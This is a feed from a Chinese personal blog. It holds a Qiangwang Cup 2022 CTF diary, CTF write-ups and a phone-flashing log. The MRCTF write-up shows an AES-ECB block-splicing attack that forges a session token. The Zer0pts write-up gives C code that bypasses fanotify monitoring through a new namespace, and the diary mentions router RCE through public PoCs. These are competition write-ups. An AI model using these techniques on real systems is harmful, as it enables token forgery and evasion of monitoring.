<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>忧郁沙茶の博客</title>
  
  
  <link href="http://crabtux.github.io/atom.xml" rel="self"/>
  
  <link href="http://crabtux.github.io/"/>
  <updated>2022-08-22T04:30:18.000Z</updated>
  <id>http://crabtux.github.io/</id>
  
  <author>
    <name>Crabtux</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>强网杯 2022 线下赛游记</title>
    <link href="http://crabtux.github.io/2022/08/22/%E5%BC%BA%E7%BD%91%E6%9D%AF-2022-%E6%B8%B8%E8%AE%B0/"/>
    <id>http://crabtux.github.io/2022/08/22/%E5%BC%BA%E7%BD%91%E6%9D%AF-2022-%E6%B8%B8%E8%AE%B0/</id>
    <published>2022-08-22T04:30:18.000Z</published>
    <updated>2022-08-22T04:30:18.000Z</updated>
    
    <content type="html"><![CDATA[<p>由于疫情原因（？），队里貌似没什么人愿意去决赛，最后好不容易才凑出四个人。</p><h1 id="2022-8-18-Day-1"><a href="#2022-8-18-Day-1" class="headerlink" title="2022/8/18 Day -1"></a>2022/8/18 Day -1</h1><p>我订的是上午十点多的火车，大概在下午两点到达了郑州东站。感觉在火车站打出租车的体验十分良好，排队没花多少时间，直到我上车发现两件事情：</p><ul><li>郑州东站是离酒店最远的火车站</li><li>这里的出租车比我想象中贵不少</li></ul><p>司机开车左突右闪，仿佛赶着投胎，导航疯狂提示严重超速，令人心生恐惧（</p><p>总之平安到了酒店，<del>好像第一次免费住这么豪华的酒店</del>。</p><p>下午在 WSL 里面装了 docker，因为对 Web 安全毫无概念，决定使用 pikachu 进行亡羊补牢的伟大工序，鏖战两小时后发现毫无效果（</p><p>晚上在酒店里吃 “商务简餐”，然而实质上就是盒饭。</p><p>吃完饭回来，我稍微写了一点 LUG 的新生活力课程讲稿。写到一半，Lstar 提议说联机糖豆人，然而我死活连不上游戏服务器，于是就变成了他们三个联机了。我受到现场气氛的感召，将工作（指新生活力课程）抛在脑后，打了一会 MHW，好像还玩了一会 Rewrite。</p><p>到了大概十二点多，我困了，就去睡觉了。</p><h1 id="2022-8-19-Day-0"><a href="#2022-8-19-Day-0" class="headerlink" title="2022/8/19 Day 0"></a>2022/8/19 Day 0</h1><p>上午九点，Lst4r 跟我们说好像有电视台的给他打电话，说有拍照环节。于是我们下楼去拍了照片，感觉非常智障，还要我们喊口号，我们商议了一下，最终决定把校训喊出来，可以说是中气不足。</p><p>下午我好像在对着 pikachu 补习 Web，写了几道题，意识到这似乎完全没有任何用处。</p><p>晚上 Lst4r 提议出去吃河南烩面（决赛有个队伍就叫这名字）。我之前从来没吃过烩面，端上来之后发现是宽面，但我好像更喜欢细面一点；然后我们还吃了一点羊肉串，感觉不错。然而吃着吃着，主办方突然说环境测试七点截止，于是我们赶紧回去测试。然而测试感觉也没啥意义，我们接了根网线，确认能够连接平台，测试就算结束了。我们又找了 0x401 的大佬给我们拍了两张照片，又在那呆了十分钟，就走人了。</p><p>出来之后，我们去附近的超市买了一点吃的喝的，然后就回到了酒店。回来之后，我并没有做什么事情，打了一会 MHW，玩了一会 Rewrite，就睡觉去了。</p><blockquote><p>有一天我把腰扭了，静流要帮我贴膏药，结果她竟然直接往我嘴里塞，我立刻明白过来她以为是内用，于是我赶紧大喊：“外敷！外敷！”</p></blockquote><img src="/images/blog07/waifu.png" width="50%" height="50%" /><h1 id="2022-8-20-Day-1"><a href="#2022-8-20-Day-1" class="headerlink" title="2022/8/20 Day 1"></a>2022/8/20 Day 1</h1><p>比赛大概是九点开始，我也忘了我那天是什么时候起床的了。</p><p>到了比赛现场，我们开始部署工作环境。部署到一半，工作人员给每个队伍都发了一个路由器（怎么又是路由器）和一个 U 盘，U 盘里面是所有 RW 题的附件。看到这个路由器，联想到前几年的固件题目，我们不禁心生恐惧。</p><p>主办方给的网线接口是通外网的，但是同样是在比赛开放之后才通网。我用这个<del>满身是洞的</del>路由器配了一个毫无意义的 WLAN。</p><p>九点比赛开始了。上来 KoH 放了两道题，brealid 和 Lstar 看到 hashrsa，发现可能跟 crypto 有点相关，非常激动，他们很快就交了份 exp 上去，并且靠一个天选随机数站了一会第一，拿到了一血，整了个实体 flag 回来。</p><p>EastXueLian 应该在看那个跟 Shellcode 有关的 KoH，似乎是要求交一份能够在各种架构上正常运行、并且能够读取当前文件夹下的 <code>flag</code> 文件内容的 shellcode，架构种类越多排名越高。<del>我怎么觉得 Defcon 出过类似的题目</del>。</p><p>我则在看 Totolink，这就是那个路由器对应的 Real World 题，400 * 3 的分值彰显着它签到题的本质。<del>开赛五分钟还是十分钟，安恒的队伍突然把这玩意秒了，我们不禁心生恐惧。</del>我在网上冲浪，发现这玩意一堆 CVE，但是 Github 上的现成 PoC 被删了。于是我用 Wayback Machine 在 Github 上找回了现成的 PoC。但我压根没打过 Real World，当时也没看懂题目描述，就以为要挂黑页才算挑战成功，就跟黑页搏斗了两个小时，最后上台的时候发现只要 RCE 一个 <code>nc -l -v 8888</code> 就行，剩下的都是节目效果（</p><p>经过一番波折（感谢 Lstar 拯救了我的社恐），下午 Totolink 这题被搞掉了。接下来，我们发现 RW 的 CMS 这题有很多人做，就一直在看。这是一个拿 PHPOK 6.2 框架搭建的网站，要求挖洞上传 Webshell，并将网站首页修改成格式固定的黑页，但是这个框架的版本太新了，没有现成的作业抄，我又不会 Web，就没有再看了。</p><p>临近 Day 1 结束的时候，出了几道新的 KoH 题，其中一道好像叫 qvm，要求逆向虚拟机，并且用这个题目给的虚拟机写 shellcode 算斐波那契数列的第 n 项，n 越大排名越高；同时主办方通知说 hashrsa 明天将不接受枚举解法，并且 hashrsa 和一道我们没做出来的 KoH 题将在第二天上午 11:00 下线。</p><p>这样第一天差不多就结束了，我们的名次在 13/32 左右，实在是令人惊讶地高。然后又去吃晚饭，我已经忘了吃的是商务盒饭还是自助餐了，总之如果是自助餐的话还是挺豪华的。</p><p>晚上我跟 Web 手看了一会 CMS，还是没啥想法；另一波人在看 KoH 的 minsha 这一题。这一题似乎是要求提交一个能够输出自身 sha256 值的 x86_64 ELF 可执行文件，他们在进行旷日持久的优化。八九点的时候，Lstar 让我帮他看看 qvm，我就开始帮他看，发现情况比他逆出来的部分复杂很多，我就接手继续去逆了。</p><p>就这样大概弄到一点半，CMS 没啥进展，但虚拟机我逆完了，感觉这个 I/O 和内存分配实在是诡异。我代码水平极差，不会写 exp，于是就写了个虚拟机的 Markdown 说明文档，丢给了 brealid 和 Lstar。brealid 展现出 OI 人的气魄，开始狂写。</p><p>到凌晨三点钟，我感觉没我啥事了，就去睡觉了。</p><h1 id="2022-8-21-Day-2"><a href="#2022-8-21-Day-2" class="headerlink" title="2022/8/21 Day 2"></a>2022/8/21 Day 2</h1><p>早上迷迷糊糊起来，Lstar 跟我说 brealid 已经把 qvm 那题写到了 int 允许范围的最大值（n = 46），我就感觉这题能拿点分了。</p><p>开场之后，我们把 qvm 的 exp 打出去，发现我们在第 4 名左右的位置（具体名次记不清了）。Redbud 打出了 n = 1500 的记录（之后问了高大佬，不出所料，是 mcfx 搞的，他也不清楚 mcfx 具体写了什么，不知道是不是什么矩阵快速幂 + 高精度之类的），拿下了第一，后来貌似长亭的大爷也打出了正解，但其他队伍表现就比较平常，像 0ops、AAA、eee 这样的强队好像也没有做正解，只是做了一些简单的特判和打表。</p><p>我们在这个排位上持续了一段时间。后面 brealid 本来打算打打表的，但是“汇编器”（感觉叫翻译器更加合适）写得有点简陋，条件判断不太好写，他就开始着力去写“编译器”（我也忘了他写的是啥了）了。</p><p>这个时候 EastXueLian 在看虚拟机逃逸，据他说洞似乎很好找，但不太好用；而现场另外的三个人一致认为 RW 已经没法做了，连 Web 中最简单的 CMS 都做不出来，还不如把所有战力全部投入到 KoH 里面（事实证明了这一决策的正确性）。</p><p>我试图接手 minsha，结果发现连编译都成问题，就作罢了。</p><p>之后 KoH 又放了两道新题，一道 maze 一道 money，maze 是写走迷宫的 shellcode，shellcode 长度越短排名越高；money 是 Lstar 擅长的区块链题，他就开始配环境搞这题，并且一直维持在第 3/4 的排名，恰了不少分。我和 EastXueLian 去看 maze，发现长亭的大爷打出了 24 Bytes 的逆天玩意。我们经过讨论后一致认为这是用了 socket 将远端的地图搞到了本地跑结果，再上传到远端，但是自己没法复现出来。我们又试图写一点东西来骗分，结果发现连骗分的东西都写不出来（</p><p>午饭仍然是“商务盒饭”，甚至是夹生饭，差评！</p><p>就这样磨到下午三四点，我们的排名在 15/32 左右反复横跳，而前 16 名是二等奖。我们的 KoH 形势不算乐观，在剩下的五题中，我们有一题 maze 写不出来，三道题只有 1 分，只有区块链还在撑着。突然，brealid 把“编译器”写了出来，开始骗分。中间磕磕绊绊，我们的 qvm 题又回到了全场第四名的位置（OI 爷 Orz）。接下来我们的排名仍然在浮动，但是到 4:30 的时候，RW 题的排队通道关闭，KoH 由于是按轮次计分，排名基本上没什么悬念了。</p><p>最终，我们以 RW 几乎垫底、KoH 全场第七的成绩拿到了 15/32 的名次，获得了线下赛二等奖，<del>恰到了烂钱。</del></p><p>晚上跟高大佬和 V1me 学长面基，跟涛哥吃了顿好的，回去打了会 Rewrite，就睡觉了。</p>]]></content>
    
    
    <summary type="html">年轻人第一次恰钱（</summary>
    
    
    
    
    <category term="CTF" scheme="http://crabtux.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>MRCTF 2022 留档</title>
    <link href="http://crabtux.github.io/2022/04/25/MRCTF-2022-%E7%95%99%E6%A1%A3/"/>
    <id>http://crabtux.github.io/2022/04/25/MRCTF-2022-%E7%95%99%E6%A1%A3/</id>
    <published>2022-04-25T06:49:14.000Z</published>
    <updated>2022-04-25T06:49:14.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="比赛情况"><a href="#比赛情况" class="headerlink" title="比赛情况"></a>比赛情况</h2><ul><li>比赛时间（UTC-8）：2022.04.23 09:00:00 ~ 2022.04.24 21:00:00，共计 36 h</li><li>比赛模式：动态分值</li><li>队伍总分：5402.347107438017</li><li>队伍排名：8 / 460</li><li>贡献分数：757.2231404958677</li></ul><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>没啥好说的，难。</p><p>跟着彪哥恰到了烂钱，打算拿去吃 K（不是</p><p>因为前 20 要写 WP，这里就把之前写的玩意直接搬过来了。</p><h2 id="ppd"><a href="#ppd" class="headerlink" title="ppd"></a>ppd</h2><p>首先尝试正常抽奖，发现获取 FLAG 进度到达 99.999999999999% 之后，抽奖要么在这个进度死循环，要么倒退到 99.999999%，那么显然不能直接抽奖。</p><p>源码在 Webpack/src/App.vue 里面，拿出来审计一下，同时结合抓包分析，发现以下事实：</p><ul><li>服务器端的主要逻辑位于 lucky.php 中</li><li>当 localStorage 和 sessionStorage 中有 enc 值时，进入页面：<ul><li>本地调用 <code>getUserInfo</code> 函数，将 enc 字段通过 POST 请求传递给 /lucky.php?action=info</li><li>服务端对 enc 进行解析，并返回解析结果</li></ul></li><li>当 localStorage 和 sessionStorage 中没有 enc 值时，进入页面：<ul><li>本地调用 <code>start</code> 函数，通过 <code>randomString</code> 函数生成一个格式固定的 username，并使用 POST 请求将 username 字段传递给 /lucky.php?action=start</li><li>服务器返回一个随机生成的 money（整形数据，数值在 50 到 80 之间），并将 time 记为 0</li><li>利用以上数据（username、money、time）生成 enc 值，并返回其解析结果</li></ul></li></ul><p>抽奖机制对于解决本题 P 用没有，所以这里就不细说了。</p><p>在对于 enc 的值进行多方分析之后，发现其原理为：使用 AES-128 的 ECB 模式对 php 序列化字符串进行加密，而序列化字符串可以在 response 的数据里找到。</p><p>AES 加密的 key 是未知的，但由于我们能够自由控制 username 区段，考虑到 AES 的块加密特性，我们可以通过构造 username，并发送到服务端进行解析，通过返回的解析结果来找到我们需要的 128 位数据块 “明文-&gt;密文” 的对应关系，而不用关心如何求出具体的 key。这样，通过构造出数个 enc，并分别提取出它们不同的有效部分进行拼接，就可以获得我们的目标 enc。</p><p>具体构造的过程如下：</p><ul><li>调用 /lucky.php?action=start，并将 username 置为 <code>AAAAAAAAAAAAA:&quot;money&quot;;i:100;&#125;</code>，POST 发送，得到第一个 enc<ul><li>此时整个序列化字符串为 <code>O:4:&quot;User&quot;:3:&#123;s:8:&quot;username&quot;;s:29:&quot;AAAAAAAAAAAAA:&quot;money&quot;;i:100;&#125;&quot;;s:5:&quot;times&quot;;i:0;s:5:&quot;money&quot;;i:57;&#125;</code></li><li>用于获取第 49 ~ 64 Byte 的 <code>:&quot;money&quot;;i:100;&#125;</code> 区块</li></ul></li><li>调用 /lucky.php?action=start，并将 username 置为 <code>AAAAAAAAAAAAAAAAAAAAAAAA</code>，POST 发送，得到第二个 enc<ul><li>此时整个序列化字符串为 <code>O:4:&quot;User&quot;:3:&#123;s:8:&quot;username&quot;;s:25:&quot;AAAAAAAAAAAAAAAAAAAAAAAAA&quot;;s:5:&quot;times&quot;;i:0;s:5:&quot;money&quot;;i:57;&#125;</code></li><li>用于获取 AES 加密时最后一行的 padding 密文</li></ul></li><li>调用 /lucky.php?action=start，并将 username 置为 <code>AAAAAAAAAAAAAAAAAAAAAAA</code>，POST 发送，得到第三个 enc<ul><li>此时整个序列化字符串为 <code>O:4:&quot;User&quot;:3:&#123;s:8:&quot;username&quot;;s:24:&quot;AAAAAAAAAAAAAAAAAAAAAAAA&quot;;s:5:&quot;times&quot;;i:0;s:5:&quot;money&quot;;i:57;&#125;</code></li><li>用于将 <code>:&quot;money&quot;;i:57;&#125;</code> 对齐到最后一个加密块里，便于整体覆盖</li></ul></li></ul><p>将上面的三个 enc 进行 base64 解码，并在十六进制编辑器下拼接，最终得到我们需要的 enc：<code>SRMr2xR0uuLsQScgoAegY5ru3gAqkC8Fe56Jv+SbDaRVViKl7DEegptDPcmPWKHkxUVEERuSp+J9pGsh2LdoMhaX0OMnP2NzLvNgOF+lczbUEOm4KpsJyCAzosg2pzGiJSK1AIGuHo/qjfgpPEkCZA==</code></p><p>将上述 enc 通过 POST 请求发送到 /lucky.php?action=getFlag 即可。</p><p>贴个截图：</p><p><img src="/images/blog08/success.png" alt="大成功" title="大成功"></p>]]></content>
    
    
    <summary type="html">好几把难。</summary>
    
    
    
    
    <category term="CTF" scheme="http://crabtux.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Zer0pts CTF 2022 留档</title>
    <link href="http://crabtux.github.io/2022/04/21/Zer0pts-CTF-2022-%E7%95%99%E6%A1%A3/"/>
    <id>http://crabtux.github.io/2022/04/21/Zer0pts-CTF-2022-%E7%95%99%E6%A1%A3/</id>
    <published>2022-04-20T17:39:19.000Z</published>
    <updated>2022-04-20T17:39:19.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="比赛情况"><a href="#比赛情况" class="headerlink" title="比赛情况"></a>比赛情况</h2><ul><li>比赛时间（UTC-8）：2022.03.19 08:00:00 ~ 2022.03.20 20:00:00，共计 36 h</li><li>比赛模式：动态分值，无一血奖励</li><li>队伍总分：723</li><li>队伍排名：52 / 632</li><li>贡献分数：127</li></ul><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>大佬们去 NeSE 打比赛了，留下我们坐牢，Orz</p><blockquote><p>We provide many fun challenges of varying difficulty and categories, and <u>none of them require any guessing skills</u>.</p></blockquote><p>就冲这个 “不需要猜”，我直接五星好评奉上。</p><h2 id="MathHash（127-pts）"><a href="#MathHash（127-pts）" class="headerlink" title="MathHash（127 pts）"></a>MathHash（127 pts）</h2><p>查看 Python 源代码，发现可以利用 tan θ 在 π/2 附近的性质逐位爆破出 flag 的后 18 位，前 7 位是 flag 的固定格式，添加即可。</p><p>代码先咕着。</p><h2 id="0av（未解出）（256-pts）"><a href="#0av（未解出）（256-pts）" class="headerlink" title="0av（未解出）（256 pts）"></a>0av（未解出）（256 pts）</h2><p>查看 <code>antivirus.c</code> 的源代码，发现其使用了 fanotify 进行文件系统的监控，若文件中出现 zer0pts 字样，则阻止一切试图读取该文件的操作，并删除此文件。</p><p>fanotify 不能监控多个 namespace 中的文件系统，考虑创建一个新的 namespace 读取文件即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mount.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (unshare(CLONE_NEWNS | CLONE_NEWUSER))</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;unshare error!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">    <span class="keyword">if</span> ((fd = open(<span class="string">&quot;/playground/flag.txt&quot;</span>, O_RDONLY)) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    read(fd, buf, <span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">puts</span>(buf);</span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 Linux 环境下编译（注意要静态链接 glibc 库），通过网络上传文件，运行即可获取 flag。</p><h2 id="readflag（未解出）（277-pts）"><a href="#readflag（未解出）（277-pts）" class="headerlink" title="readflag（未解出）（277 pts）"></a>readflag（未解出）（277 pts）</h2><p>还没复现到，之后再说吧。</p>]]></content>
    
    
    <summary type="html">难，但是有意思，但是难。</summary>
    
    
    
    
    <category term="CTF" scheme="http://crabtux.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>与红米 2s 和魔改版 mobian 系统之间的二三事</title>
    <link href="http://crabtux.github.io/2022/04/05/%E4%B8%BA%E7%BA%A2%E7%B1%B3-2-%E5%88%B7%E4%B8%8A-mobian-%E7%B3%BB%E7%BB%9F%E7%9A%84%E8%AE%B0%E5%BD%95/"/>
    <id>http://crabtux.github.io/2022/04/05/%E4%B8%BA%E7%BA%A2%E7%B1%B3-2-%E5%88%B7%E4%B8%8A-mobian-%E7%B3%BB%E7%BB%9F%E7%9A%84%E8%AE%B0%E5%BD%95/</id>
    <published>2022-04-05T15:09:50.000Z</published>
    <updated>2022-04-05T15:09:50.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>春季学期刚开学那会（大概是 2 月 20 号左右），brealid 大佬在 LUG 群里发起了拼团买二手红米 2 的邀请。手机的来源是小黄鱼，一台价格 52.4 元，5 台起卖。我寻思着备用机这玩意早晚都是要准备的，现在都有车摆在面前了，没有不上的道理，就找他拼了一台下来。</p><p>我跟 brealid 大佬联系的时候，他手上貌似已经刷上了一台，并且已经装好了 docker，成功运行了 2048 的 demo 服务，再加上看了阮行止大佬的博客：<a href="https://www.ruanx.net/redmi2-to-debian/">https://www.ruanx.net/redmi2-to-debian/</a>，发现刷机过程似乎并不复杂，便天真地以为刷机就是分分钟的事情。</p><p>前段时间，我在写 zer0pts CTF 的时候，萌生了想要复现环境的想法，在 Nebula 群里询问的时候突然意识到自己忘了 docker 这个神奇的玩意，而环境可以直接部署在局域网中，而我手上又正好多出来这么个备用机，就把它从垃圾堆里翻了出来，开始折腾起来。</p><p>这不折腾不要紧，一折腾差点要了我的命。</p><h2 id="Error-1-dtb-not-found"><a href="#Error-1-dtb-not-found" class="headerlink" title="Error 1: dtb not found"></a>Error 1: dtb not found</h2><p>按照阮行之大佬的步骤：</p><blockquote><p>首先下载刷机包：<a href="https://github.com/Project-DragonPi/mobian-wt88047">https://github.com/Project-DragonPi/mobian-wt88047</a><br>重启手机，开机时按住「音量 -」和「电源」键，进入 fastboot 模式。电脑上检测确认已连接，并刷入 lk2nd。</p></blockquote><p>成功刷入 lk2nd 之后，我的手机变砖了。被逼无奈之下，我尝试在 fastboot 模式下直接启动 lk2nd：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ fastboot boot ./lk2nd.img</span><br></pre></td></tr></table></figure><p>显示的错误信息我没有记录下来，我只记得一个关键信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error: dtb not found</span><br></pre></td></tr></table></figure><p>废了大约一天的功夫（？），我终于发现，阮行之大佬的手机预装的就是 Android 5.1 的 MIUI，而我的手机则是 Android 4.4，在使用 adb 查看 CPU 信息的时候就可以发现端倪，Android 4.4 系统会少几个 Features（不过这个好像跟 dtb 没啥关系……？）</p><p>总之在刷入 lk2nd 之前，先把手机刷成 Android 5.1 版本的 MIUI，然后再按部就班地刷入 lk2nd 即可。</p><h2 id="Error-2-显示屏大寄特寄"><a href="#Error-2-显示屏大寄特寄" class="headerlink" title="Error 2: 显示屏大寄特寄"></a>Error 2: 显示屏大寄特寄</h2><p>又过了大概两三天（？），在作业和出题的双重压迫之下，我终于想办法给它刷上了 mobian。</p><p>然而，我惊恐地发现，任凭我怎么努力地戳显示屏，手机就只能赖在锁屏界面，能做的操作只有用两只手指滑动屏幕，想点击按钮那简直是休想。不能使用触摸屏，我就不能连接网络（默认情况不支持 USB 直接连接电脑），也就不能使用 ssh 连接手机了。</p><p>折腾了大概三天左右吧，我尝试将 userdata.img 的 simg 格式转化为普通的 img 格式，在 Linux 下挂载起来，修改其中的配置文件，或者添加脚本，使得手机一开机（或者每隔一分钟）就连接 Wi-Fi，然而，我所有的努力全部木大！</p><p>最终我屈服了，在 USTC LUG 群里提了问题：<br><img src="/images/blog06/question.jpg" alt="问题" title="问题"></p><p>大佬们给出的建议有：</p><ul><li>Micro USB -&gt; 扩展坞 -&gt; 鼠标控制</li><li>qemu 启动并使用 userdata.img，查看是否安装 crontab 以及服务是否启动等</li></ul><p>正好第二天上午，在网上看到了 otg 线相关的东西，就直接从淘宝上买了一根 otg 线。第二天就到货了，我将 otg 线连接到手机上，再插入无线鼠标的 USB 接收器，神奇的事情发生了！手机屏幕上出现了一个鼠标指针！</p><p>后面的事情，像什么连接 Wi-Fi，ssh 连接，修改配置什么的，大概就不用多说了。<br>不过现在，这台机子只是处于刚刚能用的阶段，我的配置之旅才刚刚开始。</p><h2 id="Step-1-回来吧，adb！"><a href="#Step-1-回来吧，adb！" class="headerlink" title="Step 1: 回来吧，adb！"></a>Step 1: 回来吧，adb！</h2><p>光靠一个 ssh 来维系我们与这个半残废手机的联系感觉还是不太靠谱，我们需要一种备用连接方案。从刷机包的 Github repository 说明可以看到，它实际上是提供了 adb 的支持的，但是在 Windows 中使用 <code>adb devices</code> 命令却并不能发现我们的手机，怎么辉石呢？</p><p>我们首先 ssh 连接到手机，查看 <code>adbd</code> 的运行情况：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ systemctl status adbd</span><br><span class="line">● adbd.service - Android Debug Brige Daemon Service</span><br><span class="line">     Loaded: loaded (/lib/systemd/system/adbd.service; enabled; vendor preset: enabled)</span><br><span class="line">     Active: active (running) since Fri 2022-04-08 14:08:36 UTC; 13min ago</span><br><span class="line">    Process: 315 ExecStart=/usr/sbin/dragonpi-usb (code=exited, status=0/SUCCESS)</span><br><span class="line">   Main PID: 332 (adbd)</span><br><span class="line">      Tasks: 4 (<span class="built_in">limit</span>: 2211)</span><br><span class="line">     Memory: 1.0M</span><br><span class="line">        CPU: 57ms</span><br><span class="line">     CGroup: /system.slice/adbd.service</span><br><span class="line">             └─332 adbd</span><br><span class="line"></span><br><span class="line">4月 08 14:08:35 mobian systemd[1]: Starting Android Debug Brige Daemon Service...</span><br><span class="line">4月 08 14:08:36 mobian systemd[1]: Started Android Debug Brige Daemon Service.</span><br></pre></td></tr></table></figure><p>运行正常，但似乎是魔改过的 adbd？我们查看一下 /usr/sbin/dragonpi-usb 的内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ cat /usr/sbin/dragonpi-usb</span><br><span class="line"><span class="comment">#! /bin/sh</span></span><br><span class="line">USB_SERIAL=$(sha256sum &lt; /etc/machine-id | cut -d<span class="string">&#x27; &#x27;</span> -f1 | cut -c1-16)</span><br><span class="line">modprobe g_ffs idVendor=0x18d1 idProduct=0x4e42 iSerialNumber=<span class="variable">$&#123;USB_SERIAL&#125;</span></span><br><span class="line">mkdir -p /dev/usb-ffs/adb</span><br><span class="line">mount -t functionfs adb /dev/usb-ffs/adb -o uid=2000,gid=2000</span><br><span class="line">adbd &amp;</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">which</span> adbd</span><br><span class="line">/usr/bin/adbd</span><br></pre></td></tr></table></figure><p>看起来 dragonpi-usb 是一个 Shell Script，在 /usr/bin 下的 adbd 是正体可执行文件。<br>尝试运行 adbd：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ adbd</span><br><span class="line">install_listener(<span class="string">&#x27;tcp:5037&#x27;</span>,<span class="string">&#x27;*smartsocket*&#x27;</span>)</span><br><span class="line">cannot <span class="built_in">bind</span> <span class="string">&#x27;tcp:5037&#x27;</span></span><br><span class="line">$ netstat -ano | grep 5037</span><br><span class="line">tcp        0      0 127.0.0.1:5037          0.0.0.0:*               LISTEN      off (0.00/0/0)</span><br></pre></td></tr></table></figure><p>看起来使用的是 5037 端口监听，并且似乎在正常工作？那为啥我们的 adb server 没法发现这个 client 呢？</p><p>后来在网上找到了这么个帖子（论坛还是 nb）：<a href="https://whycan.com/t_903.html">https://whycan.com/t_903.html</a>，发现在 Windows 下这个驱动非常不稳定，换成 Linux 就能连上了。</p><p>那我为什么刚装上去的时候没识别出来呢（思考）</p><h2 id="Step-2-没了"><a href="#Step-2-没了" class="headerlink" title="Step 2: 没了"></a>Step 2: 没了</h2><p>后来由于这玩意充电到 100% 之后就会自动断开，不会继续充电，而且我对它没有很强的需求，调完 adb 之后这玩意就被扔到历史的角落里吃灰去了，全剧终。</p>]]></content>
    
    
    <summary type="html">年轻人的第一次刷机，总是充满了曲折与磨难。</summary>
    
    
    
    
    <category term="安卓杂项" scheme="http://crabtux.github.io/tags/%E5%AE%89%E5%8D%93%E6%9D%82%E9%A1%B9/"/>
    
  </entry>
  
  <entry>
    <title>MetaCTF 留档</title>
    <link href="http://crabtux.github.io/2021/12/06/MetaCTF-%E7%95%99%E6%A1%A3/"/>
    <id>http://crabtux.github.io/2021/12/06/MetaCTF-%E7%95%99%E6%A1%A3/</id>
    <published>2021-12-06T07:07:26.000Z</published>
    <updated>2021-12-06T07:07:26.000Z</updated>
    
